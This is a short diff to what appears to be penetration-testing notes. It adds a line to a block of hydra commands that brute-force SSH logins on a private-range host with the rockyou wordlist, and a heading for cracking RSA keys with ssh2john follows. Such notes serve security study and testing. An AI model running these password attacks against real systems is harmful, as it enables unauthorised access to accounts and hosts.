@@ -6,6 +6,9 @@
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
 
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh -s 22022 //-s for different port
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
+
 ```
 
 ## RSA Private Key crack using ssh2john
